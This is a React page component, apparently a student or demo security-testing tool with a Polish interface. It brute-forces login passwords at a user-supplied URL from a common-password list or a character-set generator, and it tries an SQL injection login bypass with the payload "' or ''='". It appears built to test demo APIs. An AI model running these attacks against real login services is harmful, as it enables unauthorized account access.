import React, {useState} from 'react';
import axios from "axios";
import TextInput from "../../components/TextInput/TextInput";
import Button from "../../components/Button/Button";
import {
    GreenLabel,
    SQLInputWrapper,
    FormContainer,
    StyledContainer,
    RedLabel,
    SectionTitle,
    PageTitle,
    InputWrapper,
    CheckBoxWrapper,
    ColumnWrapper
} from "./AuthenticationTests.styles";
import {Checkbox, MenuItem, Select} from "@mui/material";
import {generate} from "brute-force-generator";

const AuthenticationTests = props => {
    const [pageUrl, setPageUrl] = useState('http://localhost:8080/login');
    const [login, setLogin] = useState('');
    const [passwordFound, setPasswordFound] = useState(null);
    const [searchTime, setSearchTime] = useState(null);
    const [isLoading, setIsLoading] = useState(false);
    const [isLoadingSQL, setIsLoadingSQL] = useState(false);
    const [sqlInjectionStatus, setSqlInjectionStatus] = useState(null);
    const [sqlInjectionError, setSqlInjectionError] = useState(null);
    const [sqlCommand, setSqlCommand] = useState("' or ''='");
    const [userNameFieldName, setUserNameFieldName] = useState('username');
    const [passwordFieldName, setPasswordFieldName] = useState('password');
    const [bruteForceChars, setBruteForceChars] = useState('d,a,w,i');
    const [bruteForceLength, setBruteForceLength] = useState(5);
    const [usePasswordGenerator, setUsePasswordGenerator] = useState(false);

    const passwords = [
        'halina',
        'maria',
        'krzysztof',
        'admin',
        '12345',
        'qwerty',
        'zaq1@WSX',
        '54321',
        'daria',
        'dawid',
        'janek'
    ];

    const generatePasswords = () => {
        const chars = bruteForceChars.split(',');
        const gen = generate(chars, bruteForceLength);
        const passwordsArr = [];
        for (let record of gen) {
            passwordsArr.push(record);
        }
        return passwordsArr;
    }

    const loginToSystem = () => {
        setPasswordFound(null);
        setIsLoading(true);
        let start = performance.now();

        let combinations = null;

        let keepSeeking = true;

        if (usePasswordGenerator) {
            combinations = generatePasswords();
        } else {
            combinations = passwords;
        }

        for (let passwd of combinations) {
            if (keepSeeking) {
                axios.post(`${pageUrl}`, {
                    [userNameFieldName]: login,
                    [passwordFieldName]: passwd
                }).then(res => {
                    if (res.status === 200) {
                        let end = performance.now();
                        console.log(res.status)
                        setPasswordFound(passwd);
                        setSearchTime(end - start);
                        setIsLoading(false);
                        keepSeeking = false;
                    }
                })
            }
        }
        // passwords.forEach(passwd => {
        //     axios.post(`${pageUrl}`, {
        //         [userNameFieldName]: login,
        //         [passwordFieldName]: passwd
        //     }).then(res => {
        //         if (res.status === 200) {
        //             let end = performance.now();
        //             console.log(res.status)
        //             setPasswordFound(passwd);
        //             setSearchTime(end - start);
        //             setIsLoading(false);
        //         }
        //     })
        // })
    }

    const sqlInjection = () => {
        setSqlInjectionStatus(null);
        setSqlInjectionError(null);
        setIsLoadingSQL(true);
        axios.post(`${pageUrl}`, {
            [userNameFieldName]: login,
            [passwordFieldName]: sqlCommand
        }).then(res => {
            if (res.status === 200) {
                setSqlInjectionStatus(`Udało się zalogować za pomocą SQL Injection ${JSON.stringify(res.data)}`)
            }
        }).catch(err => {
            if (err) {
                setSqlInjectionError('Nie udało się wstrzyknąć SQL!')
            }
        }).finally(() => setIsLoadingSQL(false))
    }


    return (
        <>
            <PageTitle>Brute Force & SQL Injection</PageTitle>
            <FormContainer>

                <SectionTitle>Znajdź hasło metodą Brute Force</SectionTitle>
                <span>Wybierz API lub wpisz własne:</span>
                <Select style={{width: '70%'}} label={"Wybierz api"} value={pageUrl}
                        onChange={(item) => setPageUrl(item.target.value)}>
                    <MenuItem value={"https://node-app-4fun.herokuapp.com/users/login"}>Chronione Api</MenuItem>
                    <MenuItem value={"http://localhost:8080/login"}>Nie chronione Api</MenuItem>
                </Select>

                <span style={{marginTop: 12, marginBottom: 12}}>Użyj generatora haseł lub skorzystaj z gotowych</span>
                <CheckBoxWrapper>
                    <Checkbox
                        checked={usePasswordGenerator}
                        onChange={() => setUsePasswordGenerator(!usePasswordGenerator)}
                    />
                    {usePasswordGenerator && (
                        <ColumnWrapper>
                            <TextInput
                                onChange={e => setBruteForceChars(e.target.value)}
                                type={'text'}
                                name={'chars'}
                                value={bruteForceChars}
                            />
                            <TextInput
                                onChange={e => setBruteForceLength(e.target.value)}
                                type={'number'}
                                name={'chars'}
                                value={bruteForceLength}
                            />
                        </ColumnWrapper>
                    )}
                </CheckBoxWrapper>


                <InputWrapper>
                    URL Logowania strony
                    <TextInput
                        onChange={(e) => setPageUrl(e.target.value)}
                        type={'text'}
                        name={'url'}
                        placeholder={'Podaj URL do API logowania'}
                        value={pageUrl}
                    />
                </InputWrapper>
                <InputWrapper>
                    Login / E-mail
                    <TextInput
                        onChange={(e) => setLogin(e.target.value)}
                        type={'text'}
                        name={'url'}
                        placeholder={'Podaj login'}
                    />
                </InputWrapper>
                <InputWrapper>
                    Nazwa pola loginu
                    <TextInput
                        value={userNameFieldName}
                        onChange={(e) => setUserNameFieldName(e.target.value)}
                        type={'text'}
                        name={'url'}
                        placeholder={'Podaj nazwę pola loginu'}
                    />
                </InputWrapper>
                <InputWrapper>
                    Nazwa pola hasła
                    <TextInput
                        value={passwordFieldName}
                        onChange={(e) => setPasswordFieldName(e.target.value)}
                        type={'text'}
                        name={'url'}
                        placeholder={'Podaj nazwę pola hasła'}
                    />
                </InputWrapper>
                <InputWrapper>
                    {isLoading ? (
                        <span>Proszę czekać ...</span>
                    ) : (
                        <Button disabled={login === ''} onClick={() => loginToSystem()}>
                            Znajdź hasło
                        </Button>
                    )}
                </InputWrapper>
                {passwordFound && (
                    <GreenLabel>Znalezione hasło: {passwordFound}</GreenLabel>
                )}
                {searchTime && (
                    <span>czas wyszukiwania: {(searchTime / 1000).toFixed(2)} sekund</span>
                )}
                <SQLInputWrapper>
                    <SectionTitle>Sprawdzanie podatności na ataki SQL Injection</SectionTitle>
                    <TextInput
                        onChange={(e) => setSqlCommand(e.target.value)}
                        type={'text'}
                        name={'url'}
                        placeholder={'Podaj kod SQL'}
                        value={sqlCommand}
                    />
                </SQLInputWrapper>
                <InputWrapper>
                    {isLoadingSQL ? (
                        <span>Proszę czekać ...</span>
                    ) : (
                        <Button onClick={() => sqlInjection()}>
                            SQL Injection
                        </Button>
                    )}
                    {sqlInjectionStatus && (
                        <GreenLabel>{sqlInjectionStatus}</GreenLabel>
                    )}
                    {sqlInjectionError && (
                        <RedLabel>{sqlInjectionError}</RedLabel>
                    )}
                </InputWrapper>
            </FormContainer>
        </>
    );
};

export default AuthenticationTests;
